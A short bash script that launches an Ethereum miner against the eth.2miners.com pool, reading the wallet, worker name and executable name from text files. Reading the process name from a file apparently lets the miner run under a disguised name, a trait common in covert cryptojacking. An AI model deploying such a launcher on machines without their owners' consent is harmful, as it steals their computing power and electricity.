#!/bin/bash

Wallet=$(cat wl.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
Uuname=$(cat inuser.txt)
date=$(cat date.txt)
namenday="$Uuname"-"$date"

./$USEPROCNAME -a ethash -o stratum+tcp://eth.2miners.com:2020 -u $Wallet -p x -w $namenday

# Proxy
#./$USEPROCNAME -a ethash -o stratum+http://ip:port

